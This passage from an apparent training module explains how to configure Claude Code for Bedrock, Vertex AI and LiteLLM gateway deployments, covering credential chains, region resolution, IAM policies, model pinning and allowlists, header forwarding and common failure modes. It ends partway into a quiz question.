(`.claude/settings.json`) | User personal (`~/.claude/settings.json`) | Managed (`managed-settings.json`) |\n|---|---|---|---|\n| `CLAUDE_CODE_USE_BEDROCK` / `CLAUDE_CODE_USE_VERTEX` | Yes, if the whole project uses one provider | No — different devs may test different providers | Yes, for org-wide enforcement |\n| `AWS_REGION` / `CLOUD_ML_REGION` | Yes, if fixed for the project | If personal AWS profile sets it, omit here | Yes for org default |\n| `AWS_PROFILE` | Avoid — profile names differ per machine | Yes | As a default, with dev override allowed |\n| `ANTHROPIC_DEFAULT_SONNET_MODEL` | Yes — pin the exact version | Overrides committed pin — avoid unless testing | Yes — authoritative version lock |\n| `ANTHROPIC_DEFAULT_HAIKU_MODEL` | Yes — prevents cost trap | Yes if project has no committed settings | Yes |\n| `ANTHROPIC_API_KEY` | **Never** — this is a secret | Use OS keychain / shell secret manager | Use `apiKeyHelper` or `awsCredentialExport`, never plaintext |\n| `awsAuthRefresh` | Yes if SSO profile is team-standard | Yes for personal profile | As default with team profile name |\n| `model` | Yes — sets team default start model | Overrides team default | Authoritative model policy |\n| `availableModels` + `enforceAvailableModels` | As soft guidance | No effect when managed overrides | Managed value replaces all lower levels |\n\n### Managed settings for org-wide distribution\n\nFor enterprise deployments, the managed settings files are deployed out-of-band (MDM, Ansible, Group Policy):\n\n- **macOS**: `/Library/Application Support/ClaudeCode/managed-settings.json`\n- **Linux/WSL**: `/etc/claude-code/managed-settings.json`\n- **Windows**: `C:\\Program Files\\ClaudeCode\\managed-settings.json`\n\nA drop-in directory (`managed-settings.d/`) lets you merge multiple policy fragments — useful when provider config comes from one team and permission policy from another:\n\n```\n/etc/claude-code/managed-settings.d/\n  10-provider-bedrock.json   # CLAUDE_CODE_USE_BEDROCK, model pins\n  20-models.json             # availableModels, enforceAvailableModels\n  30-permissions.json        # deny rules, allowManagedPermissionRulesOnly\n```\n\nFiles in the drop-in directory merge in alphabetical order. Managed settings have the highest precedence for most keys. For `availableModels`, the managed value **replaces** the merged result from lower levels — entries in user or project settings cannot widen the allowlist past what managed sets.\n\n### What to never put in the `env` block\n\nDo not put plaintext API keys in `env`. Use `apiKeyHelper` (a script that outputs the key) or `awsCredentialExport` (a script outputting the AWS credentials JSON) instead. The helper scripts are invoked at session start and on refresh — they can read from a vault, OS keychain, or IAM role without embedding secrets in files."
   },
   {
    "heading": "Provider Auth & Credential Refresh",
    "body": "Each provider backend authenticates via its cloud SDK's standard credential chain. Claude Code does not manage raw cloud credentials — it delegates to the AWS SDK or GCP ADC — but it does need hooks to refresh those credentials when they expire mid-session.\n\n### Bedrock credential chain\n\nClaude Code resolves AWS credentials using the standard AWS SDK credential chain. The most common options:\n\n```bash\n# Option A: Access key env vars\nexport AWS_ACCESS_KEY_ID=your-access-key-id\nexport AWS_SECRET_ACCESS_KEY=your-secret-access-key\nexport AWS_SESSION_TOKEN=your-session-token  # if using temporary credentials\n\n# Option B: SSO profile\naws sso login --profile=your-profile-name\nexport AWS_PROFILE=your-profile-name\n\n# Option C: Bedrock API keys (simpler — no STS required)\nexport AWS_BEARER_TOKEN_BEDROCK=your-bedrock-api-key\nexport CLAUDE_CODE_USE_BEDROCK=1\n```\n\nInstance metadata (EC2/ECS/Lambda role) is resolved automatically when running on AWS infrastructure.\n\n### Vertex AI credential chain\n\nClaude Code uses Application Default Credentials (ADC) in the standard GCP order: `GOOGLE_APPLICATION_CREDENTIALS` pointing to a service account JSON (or an X.509 Workload Identity Federation credential config), then `gcloud auth application-default login` cached credentials, then the metadata server on GCE/Cloud Run.\n\nProject ID resolution (in order of precedence):\n1. `GCLOUD_PROJECT` or `GOOGLE_CLOUD_PROJECT` env vars\n2. The project in the credential file referenced by `GOOGLE_APPLICATION_CREDENTIALS`\n3. `ANTHROPIC_VERTEX_PROJECT_ID` env var\n4. `gcloud` active project config\n5. Attached service account project (on GCE)\n\n### Refresh hooks\n\nTwo settings hooks handle AWS credential expiry:\n\n**`awsAuthRefresh`** — runs only when Claude Code detects AWS credentials are expired (by timestamp or when Bedrock returns a credential error), then retries. Output is shown to the user. Works for browser-based SSO flows:\n\n```json\n{\n  \"awsAuthRefresh\": \"aws sso login --profile myprofile\",\n  \"env\": { \"AWS_PROFILE\": \"myprofile\" }\n}\n```\n\n**`awsCredentialExport`** — runs at session start and on each credential reload, even when credentials are still valid. Use this only when you need cross-account credentials that differ from what the default credential chain would produce. Output is captured silently (not shown to user). Must output JSON in the nested format:\n\n```json\n{\n  \"Credentials\": {\n    \"AccessKeyId\": \"value\",\n    \"SecretAccessKey\": \"value\",\n    \"SessionToken\": \"value\",\n    \"Expiration\": \"2026-01-01T00:00:00Z\"\n  }\n}\n```\n\nAs of Claude Code v2.1.181, the flat output format from `aws configure export-credentials --format process` (same keys at the top level, not nested) is also accepted.\n\nWhen `Expiration` is a valid ISO 8601 timestamp (Claude Code v2.1.176+), credentials are cached until 5 minutes before that time. Without it, or on earlier versions, credentials are cached for one hour.\n\n**`gcpAuthRefresh`** — runs when Claude Code detects expired GCP credentials, then retries. The command's output is displayed to the user. The refresh command times out after three minutes if authentication does not complete:\n\n```json\n{\n  \"gcpAuthRefresh\": \"gcloud auth application-default login\",\n  \"env\": { \"ANTHROPIC_VERTEX_PROJECT_ID\": \"your-project-id\" }\n}\n```\n\n### Dynamic API key rotation (for LLM gateway deployments)\n\nFor gateways using rotating or per-user API keys, use `apiKeyHelper`:\n\n```json\n{\n  \"apiKeyHelper\": \"~/bin/get-litellm-key.sh\"\n}\n```\n\nThe helper's stdout is sent as both the `Authorization` (Bearer) and `X-Api-Key` headers. Refresh interval is controlled by:\n\n```bash\nexport CLAUDE_CODE_API_KEY_HELPER_TTL_MS=3600000  # 1 hour\n```\n\n`apiKeyHelper` has lower precedence than `ANTHROPIC_AUTH_TOKEN` or `ANTHROPIC_API_KEY` — if either of those is set, the helper is never called.\n\n### Common auth pitfall: SSO loop with corporate proxies\n\nIf browser tabs spawn repeatedly during SSO: remove `awsAuthRefresh`. Corporate VPNs or TLS inspection proxies interrupt the SSO browser flow; Claude Code misreads it as credential failure and re-runs the refresh command in a tight loop. Workaround: run `aws sso login` manually before starting Claude Code, and do not configure `awsAuthRefresh` in environments with aggressive TLS inspection."
   },
   {
    "heading": "Region & Project Resolution Order",
    "body": "A stale region or GCP project silently routes requests to the wrong endpoint, the wrong model availability pool, and the wrong cost center. Know the exact resolution chains.\n\n### Bedrock region resolution (v2.1.172+)\n\n1. `AWS_REGION` env var\n2. `AWS_DEFAULT_REGION` env var\n3. `region` on the active AWS profile (from `AWS_SHARED_CREDENTIALS_FILE` → `AWS_CONFIG_FILE`, defaulting to `~/.aws/credentials` and `~/.aws/config`)\n4. `us-east-1` (hardcoded fallback)\n\nThe active profile is `AWS_PROFILE` if set, otherwise `default`. Run `/status` to see the resolved region and its source — when it came from the config file or the fallback, `/status` notes that explicitly.\n\nOn v2.1.171 and earlier, Claude Code does not read AWS config files at all. Set `AWS_REGION` explicitly on those versions.\n\nFor the small/fast model (Haiku), there is a separate region override:\n\n```bash\nexport ANTHROPIC_SMALL_FAST_MODEL_AWS_REGION=us-west-2\n```\n\nThis has no effect unless `ANTHROPIC_DEFAULT_HAIKU_MODEL` is also set.\n\n### Bedrock cross-region inference profiles\n\nInference profile IDs use a region prefix (`us.`, `eu.`, `ap.`, `us-gov.` for GovCloud). The profile itself handles cross-region routing — you do not need to list all regions. Use the appropriate prefix for your geography:\n\n```bash\nexport ANTHROPIC_DEFAULT_SONNET_MODEL='us.anthropic.claude-sonnet-4-6'\n# or for EU:\nexport ANTHROPIC_DEFAULT_SONNET_MODEL='eu.anthropic.claude-sonnet-4-6'\n```\n\nIf you receive an error \"on-demand throughput isn't supported\", you must use an inference profile ID rather than a foundation model ID.\n\n### Vertex AI region and project resolution\n\nProject ID resolution (in order of precedence):\n1. `GCLOUD_PROJECT` or `GOOGLE_CLOUD_PROJECT` env vars\n2. The project in the credential file referenced by `GOOGLE_APPLICATION_CREDENTIALS`\n3. `ANTHROPIC_VERTEX_PROJECT_ID` env var\n4. `gcloud` active project config\n5. Attached service account project (on GCE)\n\nRegion is set via `CLOUD_ML_REGION`. Vertex supports three forms:\n- `global` — global endpoint (broadest availability)\n- `us` or `eu` — multi-region locations (hosted on `aiplatform.us.rep.googleapis.com` / `aiplatform.eu.rep.googleapis.com`)\n- `us-east5`, `europe-west1`, etc. — specific regions\n\nNot all models support all endpoint types. When using `CLOUD_ML_REGION=global`, check the Vertex AI Model Garden to confirm each model you need supports global endpoints. For models that do not support global endpoints, override per-model with:\n\n```bash\nexport VERTEX_REGION_CLAUDE_HAIKU_4_5=us-east5\nexport VERTEX_REGION_CLAUDE_4_6_SONNET=europe-west1\n```\n\nThe docs note that most model versions have a corresponding `VERTEX_REGION_CLAUDE_*` variable; the full list is in the Environment variables reference.\n\n### The stale `CLOUD_ML_REGION` problem\n\nIf `CLOUD_ML_REGION=us-east5` is set from a previous config and your org's quota is in `europe-west1`, every request will fail with 404 or quota errors. Always verify the resolved region against your Vertex AI quota dashboard before rolling out."
   },
   {
    "heading": "Model Access Provisioning",
    "body": "Authentication to the cloud provider is necessary but not sufficient. Each provider additionally requires that the specific Claude model be explicitly enabled or approved before Claude Code can invoke it. Skipping this step produces model-specific 404 or access-denied errors rather than general auth failures.\n\n### Amazon Bedrock\n\nModel access requires a use-case form submission, once per AWS account:\n\n1. Navigate to the [Amazon Bedrock console](https://console.aws.amazon.com/bedrock/) → Model catalog\n2. Select each Anthropic model (Sonnet, Haiku, Opus separately)\n3. Submit the use case form — access is granted immediately after submission\n\nFor AWS Organizations, the management account can submit once using the `PutUseCaseForModelAccess` API (requires the `bedrock:PutUseCaseForModelAccess` IAM permission), and approval extends to child accounts automatically.\n\nMinimum IAM policy for Claude Code (two statements — model access plus marketplace subscription):\n\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"AllowModelAndInferenceProfileAccess\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"bedrock:InvokeModel\",\n        \"bedrock:InvokeModelWithResponseStream\",\n        \"bedrock:ListInferenceProfiles\",\n        \"bedrock:GetInferenceProfile\"\n      ],\n      \"Resource\": [\n        \"arn:aws:bedrock:*:*:inference-profile/*\",\n        \"arn:aws:bedrock:*:*:application-inference-profile/*\",\n        \"arn:aws:bedrock:*:*:foundation-model/*\"\n      ]\n    },\n    {\n      \"Sid\": \"AllowMarketplaceSubscription\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"aws-marketplace:ViewSubscriptions\",\n        \"aws-marketplace:Subscribe\"\n      ],\n      \"Resource\": \"*\",\n      \"Condition\": {\n        \"StringEquals\": {\n          \"aws:CalledViaLast\": \"bedrock.amazonaws.com\"\n        }\n      }\n    }\n  ]\n}\n```\n\n`bedrock:GetInferenceProfile` lets Claude Code resolve ARNs to model shapes without a retry round-trip. Without it, Claude Code retries once with an alternate shape on each new model — requests still succeed but each new model adds an extra round-trip. This matters most for `AWS_BEARER_TOKEN_BEDROCK` deployments where the token policy is typically narrow.\n\n### Google Vertex AI\n\nTwo provisioning steps:\n\n1. Enable the Vertex AI API for the project:\n```bash\ngcloud config set project YOUR-PROJECT-ID\ngcloud services enable aiplatform.googleapis.com\n```\n\n2. Request model access in the Vertex AI Model Garden for each Claude model. Access may take 24-48 hours to be approved.\n\nMinimum IAM role: `roles/aiplatform.user` (includes `aiplatform.endpoints.predict`). A custom role with only that permission is sufficient.\n\n### Claude Code startup model checks\n\nAt startup (Bedrock v2.1.94+, Vertex v2.1.98+), Claude Code verifies that the models it intends to use are accessible in your account. If the pinned version is older than the current default and the newer version is available, Claude Code prompts you to update the pin. If the default is unavailable and no pin is set, Claude Code falls back to the previous version for that session (the fallback is not persisted). This is why model access provisioning must happen before deployment — a developer whose account has not enabled Haiku will silently fall back to the primary model if Haiku is their pinned small/fast model.\n\n### Diagnostic check\n\n```bash\n# Verify accessible inference profiles on Bedrock\naws bedrock list-inference-profiles --region us-east-1\n\n# If a model shows \"on-demand throughput isn't supported\"\n# → use an inference profile ID instead of the foundation model ID\n```"
   },
   {
    "heading": "LLM Gateway (LiteLLM): Architecture and When to Use One",
    "body": "A gateway is a proxy deployed between Claude Code clients and one or more model provider backends. It exposes a standardized API surface and centralizes auth, routing, fallback, logging, and cost attribution for the whole team.\n\n### When a gateway is worth the operational overhead\n\n| Use case | Without gateway | With gateway |\n|---|---|---|\n| Shared API key management | Each dev has own key or shared secret in shell | Gateway holds the key; devs auth to gateway |\n| Per-team cost attribution | Not possible — all calls under one key | `X-Claude-Code-Agent-Id` and session headers enable per-team breakdown |\n| Provider failover | Manual reconfiguration per dev | Gateway-level fallback, invisible to clients |\n| Load balancing across regions | Not possible in Claude Code directly | Gateway routes across region pools |\n| Compliance audit log | Scattered CloudWatch / GCP logs | Central structured log at gateway |\n| Model access control | `availableModels` in managed settings | Gateway can enforce at the HTTP layer |\n\nOperational cost: you run the gateway service. Additional latency. Gateway becomes a single point of failure if not HA-deployed.\n\n**Security note:** LiteLLM PyPI versions 1.82.7 and 1.82.8 were compromised with credential-stealing malware. Do not install those versions. If already installed: remove the package, rotate all credentials, and follow the remediation steps in BerriAI/litellm#24518. Anthropic does not endorse or audit LiteLLM's security.\n\n### LiteLLM configuration for Claude Code\n\nLiteLLM exposes three integration paths:\n\n**Unified Anthropic-format endpoint (recommended):**\n```bash\nexport ANTHROPIC_BASE_URL=https://litellm-server:4000\n```\nThis gives Claude Code load balancing, fallbacks, and cost tracking through the gateway.\n\n**Provider-specific pass-through endpoints:**\n```bash\n# Bedrock pass-through\nexport ANTHROPIC_BEDROCK_BASE_URL=https://litellm-server:4000/bedrock\nexport CLAUDE_CODE_SKIP_BEDROCK_AUTH=1\nexport CLAUDE_CODE_USE_BEDROCK=1\n\n# Vertex pass-through\nexport ANTHROPIC_VERTEX_BASE_URL=https://litellm-server:4000/vertex_ai/v1\nexport ANTHROPIC_VERTEX_PROJECT_ID=your-gcp-project-id\nexport CLAUDE_CODE_SKIP_VERTEX_AUTH=1\nexport CLAUDE_CODE_USE_VERTEX=1\nexport CLOUD_ML_REGION=us-east5\n\n# Claude Platform on AWS pass-through\nexport ANTHROPIC_AWS_BASE_URL=https://litellm-server:4000/anthropic-aws\nexport ANTHROPIC_AWS_WORKSPACE_ID=wrkspc_01ABCDEFGHIJKLMN\nexport CLAUDE_CODE_SKIP_ANTHROPIC_AWS_AUTH=1\nexport CLAUDE_CODE_USE_ANTHROPIC_AWS=1\n```\n\nWith pass-through, `CLAUDE_CODE_SKIP_*_AUTH=1` is required — the gateway injects credentials server-side, and Claude Code must not add its own SigV4 or ADC headers.\n\n### Gateway model discovery\n\nWhen `ANTHROPIC_BASE_URL` points at a gateway, Claude Code can query the gateway's `/v1/models` endpoint at startup and populate the `/model` picker with what the gateway exposes (requires v2.1.129+):\n\n```bash\nexport CLAUDE_CODE_ENABLE_GATEWAY_MODEL_DISCOVERY=1\n```\n\nDiscovery is off by default so that gateways backed by a shared API key do not surface every model the key can access to every user. Only model IDs beginning with `claude` or `anthropic` are added to the picker. Each discovered entry is labeled \"From gateway\" and uses the `display_name` field from the response when provided. Results are cached to `~/.claude/cache/gateway-models.json` and refreshed on each startup. Discovery applies only to the Anthropic Messages format; it does not run for Bedrock or Vertex pass-through endpoints.\n\n### Custom model entry\n\nTo add a single gateway-routed model to the picker without enabling full discovery:\n\n```bash\nexport ANTHROPIC_CUSTOM_MODEL_OPTION=\"my-gateway/claude-opus-4-7\"\nexport ANTHROPIC_CUSTOM_MODEL_OPTION_NAME=\"Opus via Gateway\"\nexport ANTHROPIC_CUSTOM_MODEL_OPTION_DESCRIPTION=\"Internal LLM gateway deployment\"\n```\n\nClaude Code skips validation on this model ID — you can use any string your gateway endpoint accepts."
   },
   {
    "heading": "Gateway Header & Attribution Contract",
    "body": "A gateway that does not forward the correct headers will silently degrade Claude Code functionality. The header contract is non-negotiable and must be verified during gateway setup, not discovered through user complaints.\n\n### Headers the gateway MUST forward\n\n| Format | What must be forwarded |\n|---|---|\n| Anthropic Messages (`/v1/messages`) | `anthropic-beta`, `anthropic-version` request headers |\n| Bedrock InvokeModel (`/invoke`, `/invoke-with-response-stream`) | `anthropic_beta`, `anthropic_version` fields in the request body |\n| Vertex rawPredict (`:rawPredict`, `:streamRawPredict`, `/count-tokens:rawPredict`) | `anthropic-beta`, `anthropic-version` request headers |\n\nFailure to forward `anthropic-beta` means beta features (extended thinking, tool use variants, 1M context) silently revert to baseline behavior. Claude Code sends these headers to opt into capabilities; if the gateway drops them, the model responds without those capabilities and no error is raised.\n\n### Headers Claude Code sends for attribution\n\nClaude Code adds these headers on every request:\n\n| Header | Purpose |\n|---|---|\n| `X-Claude-Code-Session-Id` | Unique per session — aggregate all API calls from one session without parsing bodies |\n| `X-Claude-Code-Agent-Id` | Identifies the subagent within a session. Present only for requests made by an in-process subagent or teammate |\n| `X-Claude-Code-Parent-Agent-Id` | Identifies the spawning agent for nested agent hierarchies. Present only when the requesting agent was itself spawned by another agent |\n\nBoth agent ID headers are ephemeral per-spawn identifiers, not persistent user or device IDs. Gateways that strip these headers lose the ability to attribute cost to specific sessions or agents.\n\n### System prompt attribution block\n\nClaude Code prepends a short attribution block to the system prompt (client version and a fingerprint derived from the conversation). The Anthropic API strips this before processing, so it does not affect first-party prompt caching. On a gateway with its own prompt cache keyed on the full request body, this block causes cache misses:\n\n```bash\nexport CLAUDE_CODE_ATTRIBUTION_HEADER=0  # Omit the attribution block\n```\n\nSet this only if your gateway has a body-keyed prompt cache and you are seeing unexpected cache miss rates.\n\n### Beta feature degradation trap\n\nIf your gateway is a simple reverse proxy that strips unknown headers for \"security,\" `anthropic-beta` will be dropped. The symptom is that extended thinking, interleaved thinking, or tool search features that work against the Anthropic API directly silently stop working through the gateway. Test by sending a request with a beta header directly to the gateway and verifying it appears in the backend provider's received headers.\n\nWhen a gateway exposes the Anthropic Messages format but actually routes to Bedrock or Vertex on the backend, set:\n\n```bash\nexport CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS=1\n```\n\nThis prevents Claude Code from sending beta headers that the underlying provider does not accept.\n\n### Vertex AI MCP tool search\n\nClaude Code disables MCP tool search by default on Vertex AI (tools load upfront instead). To enable it for models that support it (Sonnet 4.5+ and Opus 4.5+):\n\n```bash\nexport ENABLE_TOOL_SEARCH=true\n```\n\nEarlier models on Vertex AI do not accept the required beta header, and requests fail if you enable tool search with them."
   },
   {
    "heading": "Model Restriction and Enforcement",
    "body": "Pinning a model version is not the same as enforcing it. The `model` setting in settings files is an initial selection — users can open `/model` and switch to `default`, which resolves to the system's runtime default for their subscription tier regardless of what `model` is set to. Enterprise deployments that need strict governance require a combination of settings.\n\n### Full model lockdown pattern\n\n```json\n{\n  \"model\": \"claude-sonnet-4-5\",\n  \"availableModels\": [\"claude-sonnet-4-5\", \"haiku\"],\n  \"enforceAvailableModels\": true,\n  \"env\": {\n    \"ANTHROPIC_DEFAULT_SONNET_MODEL\": \"claude-sonnet-4-5\",\n    \"ANTHROPIC_DEFAULT_HAIKU_MODEL\": \"us.anthropic.claude-haiku-4-5-20251001-v1:0\"\n  }\n}\n```\n\n- `model` sets the starting model\n- `availableModels` restricts the `/model` picker. The allowlist applies everywhere a user can specify a model: `/model`, `--model`, `ANTHROPIC_MODEL`, subagent `model` frontmatter, the `advisorModel` setting, and fallback chains\n- `enforceAvailableModels: true` makes the `default` option in the picker also obey the allowlist — when the tier default is not in the allowlist, Default resolves to the first allowed entry instead (requires Claude Code v2.1.175+)\n- The `env` block pins what each permitted alias resolves to, so `sonnet` cannot drift to a newer version without an explicit update\n\n### Merge semantics (critical)\n\n`availableModels` in user/project/local settings is **merged and deduplicated** across those scopes. But when set in **managed** settings, the managed value **replaces** the merged result entirely — user or project entries cannot widen the managed allowlist. This is the only way to enforce a strict allowlist as of v2.1.175+.\n\nA blocked `--model` flag or `ANTHROPIC_MODEL` env var is replaced at startup with a warning (naming both the requested and substituted models), and the session starts on the default model. A blocked subagent `model` frontmatter field falls back to the inherited or default model rather than failing the request.\n\n### Fallback chains\n\nWhen the primary model is overloaded or unavailable (not blocked — that is different behavior), Claude Code can fall back through a chain:\n\n```json\n{\n  \"fallbackModel\": [\"claude-sonnet-4-6\", \"claude-haiku-4-5\"]\n}\n```\n\n```bash\nclaude --fallback-model sonnet,haiku\n```\n\nChains are capped at three models after duplicate removal. Elements blocked by `availableModels` are dropped from the chain when it is read. The switch lasts for the current turn only; the next message tries the primary model first again. Authentication, billing, rate-limit, request-size, and transport errors never trigger a chain switch."
   },
   {
    "heading": "Complete Reference: Provider Environment Variables",
    "body": "All env vars organized by provider for copy-paste use. Set these in the `env` block of your settings file rather than as raw shell exports.\n\n### Bedrock\n\n```bash\n# Provider selection\nCLAUDE_CODE_USE_BEDROCK=1\nCLAUDE_CODE_USE_MANTLE=1          # Mantle endpoint (Anthropic API shape via AWS)\n\n# Region\nAWS_REGION=us-east-1              # Explicit override (takes precedence)\nAWS_DEFAULT_REGION=us-east-1      # Lower precedence than AWS_REGION\nANTHROPIC_SMALL_FAST_MODEL_AWS_REGION=us-west-2  # Haiku-tier region override\n\n# Credentials\nAWS_PROFILE=claude-code-prod\nAWS_ACCESS_KEY_ID=...\nAWS_SECRET_ACCESS_KEY=...\nAWS_SESSION_TOKEN=...\nAWS_BEARER_TOKEN_BEDROCK=...      # Bedrock API key (simpler than IAM)\n\n# Model pins\nANTHROPIC_DEFAULT_FABLE_MODEL=us.anthropic.claude-fable-5\nANTHROPIC_DEFAULT_OPUS_MODEL=us.anthropic.claude-opus-4-8\nANTHROPIC_DEFAULT_SONNET_MODEL=us.anthropic.claude-sonnet-4-6\nANTHROPIC_DEFAULT_HAIKU_MODEL=us.anthropic.claude-haiku-4-5-20251001-v1:0\n\n# Endpoint overrides\nANTHROPIC_BEDROCK_BASE_URL=https://...       # Custom Bedrock endpoint\nANTHROPIC_BEDROCK_MANTLE_BASE_URL=https://... # Custom Mantle endpoint\n\n# Auth bypass (for gateway deployments)\nCLAUDE_CODE_SKIP_BEDROCK_AUTH=1\nCLAUDE_CODE_SKIP_MANTLE_AUTH=1\n\n# Service tier\nANTHROPIC_BEDROCK_SERVICE_TIER=priority      # default | flex | priority\n\n# Prompt caching\nDISABLE_PROMPT_CACHING=1\nENABLE_PROMPT_CACHING_1H=1\n\n# Beta headers (set when gateway uses Anthropic format but routes to Bedrock)\nCLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS=1\n```\n\n### Vertex AI\n\n```bash\n# Provider selection\nCLAUDE_CODE_USE_VERTEX=1\n\n# Region and project\nCLOUD_ML_REGION=global             # global | us | eu | us-east5 | etc.\nANTHROPIC_VERTEX_PROJECT_ID=your-project-id  # Overridden by GCLOUD_PROJECT/GOOGLE_CLOUD_PROJECT\n\n# Per-model region overrides (for models not supporting global endpoints)\nVERTEX_REGION_CLAUDE_HAIKU_4_5=us-east5\nVERTEX_REGION_CLAUDE_4_6_SONNET=europe-west1\n\n# Credentials\nGOOGLE_APPLICATION_CREDENTIALS=/path/to/service-account.json\n\n# Model pins\nANTHROPIC_DEFAULT_FABLE_MODEL=claude-fable-5\nANTHROPIC_DEFAULT_OPUS_MODEL=claude-opus-4-8\nANTHROPIC_DEFAULT_SONNET_MODEL=claude-sonnet-4-6\nANTHROPIC_DEFAULT_HAIKU_MODEL=claude-haiku-4-5@20251001\n\n# Endpoint override\nANTHROPIC_VERTEX_BASE_URL=https://...\n\n# Auth bypass (for gateway)\nCLAUDE_CODE_SKIP_VERTEX_AUTH=1\n\n# MCP tool search (disabled by default on Vertex; Sonnet 4.5+ and Opus 4.5+ only)\nENABLE_TOOL_SEARCH=true\n```\n\n### Anthropic API / Gateway\n\n```bash\n# Direct Anthropic API\nANTHROPIC_API_KEY=sk-ant-...\nANTHROPIC_AUTH_TOKEN=...           # Bearer token alternative (higher precedence than apiKeyHelper)\nANTHROPIC_BASE_URL=https://...     # LLM gateway URL\n\n# Gateway-specific\nCLAUDE_CODE_ENABLE_GATEWAY_MODEL_DISCOVERY=1  # Requires v2.1.129+\nCLAUDE_CODE_API_KEY_HELPER_TTL_MS=3600000\nCLAUDE_CODE_ATTRIBUTION_HEADER=0   # Disable attribution block for body-keyed caches\nCLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS=1  # When gateway uses Anthropic format but routes to Bedrock/Vertex\n```\n\n### Cross-provider\n\n```bash\n# Custom model picker entry\nANTHROPIC_CUSTOM_MODEL_OPTION=my-gateway/claude-opus-4-7\nANTHROPIC_CUSTOM_MODEL_OPTION_NAME=\"Opus via Gateway\"\nANTHROPIC_CUSTOM_MODEL_OPTION_DESCRIPTION=\"Internal LLM gateway deployment\"\nANTHROPIC_CUSTOM_MODEL_OPTION_SUPPORTED_CAPABILITIES=effort,thinking\n\n# Capability declarations for provider-specific IDs\nANTHROPIC_DEFAULT_OPUS_MODEL_NAME=\"Opus 4.8 (Bedrock)\"\nANTHROPIC_DEFAULT_OPUS_MODEL_SUPPORTED_CAPABILITIES=effort,xhigh_effort,max_effort,thinking,adaptive_thinking,interleaved_thinking\n\n# Deprecated — use ANTHROPIC_DEFAULT_HAIKU_MODEL instead\nANTHROPIC_SMALL_FAST_MODEL=...     # Still works but deprecated\n\n# Prompt caching per-tier\nDISABLE_PROMPT_CACHING_HAIKU=1\nDISABLE_PROMPT_CACHING_SONNET=1\nDISABLE_PROMPT_CACHING_OPUS=1\nDISABLE_PROMPT_CACHING_FABLE=1\n```"
   },
   {
    "heading": "Common Pitfalls and Failure Modes",
    "body": "A consolidated list of the failure modes that actually occur in production deployments, with their symptoms and fixes.\n\n### 1. Alias drift after Claude Code update\n**Symptom**: Users suddenly get errors about model availability or behavior changes mid-sprint.\n**Cause**: Claude Code binary updated; built-in alias defaults changed; pinned env vars not set.\n**Fix**: Set `ANTHROPIC_DEFAULT_SONNET_MODEL`, `ANTHROPIC_DEFAULT_OPUS_MODEL`, `ANTHROPIC_DEFAULT_HAIKU_MODEL` to explicit version IDs in managed settings. Re-evaluate pins when deliberately upgrading.\n\n### 2. Small/fast model running at primary rates\n**Symptom**: AWS/GCP costs higher than expected; Sonnet invocations with very short completions in cost report.\n**Cause**: `ANTHROPIC_DEFAULT_HAIKU_MODEL` not set; background tasks using primary model.\n**Fix**: Set `ANTHROPIC_DEFAULT_HAIKU_MODEL` and verify Haiku is enabled in your account/project.\n\n### 3. Stale provider flag from shell profile\n**Symptom**: Developer reports routing to wrong provider; `/status` shows unexpected provider.\n**Cause**: Shell profile still has `CLAUDE_CODE_USE_BEDROCK=1` from a previous experiment.\n**Fix**: Move all provider flags to settings file `env` block; eliminate shell-level Claude Code env vars from onboarding docs.\n\n### 4. Gateway drops `anthropic-beta` header\n**Symptom**: Extended thinking, tool search, or 1M context does not work through gateway but works directly.\n**Cause**: Gateway middleware strips unrecognized request headers.\n**Fix**: Allowlist `anthropic-beta` and `anthropic-version` in gateway header pass-through config. Test with `curl` to verify headers reach the backend.\n\n### 5. ARN capability detection failure\n**Symptom**: `/effort` command not available; extended thinking toggle does nothing on Bedrock.\n**Cause**: Provider-specific ARN does not match Claude Code's built-in capability detection patterns.\n**Fix**: Set `ANTHROPIC_DEFAULT_OPUS_MODEL_SUPPORTED_CAPABILITIES=effort,xhigh_effort,max_effort,thinking,adaptive_thinking,interleaved_thinking`.\n\n### 6. Vertex 404 model-not-found\n**Symptom**: Claude Code fails at startup with 404; model not found on Vertex.\n**Cause**: Model not approved in Model Garden, or wrong region for that model.\n**Fix**: Check Model Garden approval status. If using `CLOUD_ML_REGION=global`, verify model supports global endpoints. Set per-model region override via `VERTEX_REGION_<MODEL_NAME>` for models that only support specific regions.\n\n### 7. `availableModels` allowlist widened unexpectedly\n**Symptom**: Users can select models outside the intended allowlist.\n**Cause**: `availableModels` set in project settings is merged with user settings; managed value not used.\n**Fix**: Set `availableModels` in managed settings — the managed value replaces all lower-level values rather than merging. Requires v2.1.175+.\n\n### 8. SSO credential refresh loop\n**Symptom**: Browser tabs open repeatedly; Claude Code does not start or hangs.\n**Cause**: `awsAuthRefresh` configured; corporate proxy interrupts the SSO flow; Claude Code interprets interrupted connection as credential failure and re-runs refresh indefinitely.\n**Fix**: Remove `awsAuthRefresh`; run `aws sso login` manually before starting Claude Code in these environments.\n\n### 9. `modelOverrides` keys silently ignored\n**Symptom**: ARN overrides not applied; model picker shows built-in Bedrock model IDs instead of configured ARNs.\n**Cause**: Keys in `modelOverrides` do not exactly match Anthropic model IDs as listed in the Models overview (e.g., missing date suffix, wrong case).\n**Fix**: Keys must match exactly as listed in the Models overview, including the full dated form where applicable (e.g., `claude-opus-4-5-20251101`). Unknown keys are silently ignored.\n\n### 10. GCP project resolution surprise\n**Symptom**: Requests go to a different GCP project than `ANTHROPIC_VERTEX_PROJECT_ID` specifies.\n**Cause**: `GCLOUD_PROJECT` or `GOOGLE_CLOUD_PROJECT` env vars take precedence over `ANTHROPIC_VERTEX_PROJECT_ID`.\n**Fix**: Ensure `GCLOUD_PROJECT` and `GOOGLE_CLOUD_PROJECT` are either unset or set to the intended project. Do not rely on `ANTHROPIC_VERTEX_PROJECT_ID` to override an already-set `GCLOUD_PROJECT`."
   }
  ],
  "preQuiz": [
   {
    "prompt": "Your team deploys Claude Code on AWS Bedrock without pinning any model IDs. A month later, Anthropic releases a new Sonnet version and your provider enables it. What actually happens to your team's sessions?",
    "options": [
     "Nothing changes — Claude Code always uses the latest model the provider has enabled.",
     "Claude Code continues using the same model version it used at install time, since the binary locks the version.",
     "The sonnet/opus/haiku aliases resolve to Claude Code's built-in per-provider default, which may lag behind the newest release and may not be enabled in your account — your team stays on the old default, not the new release.",
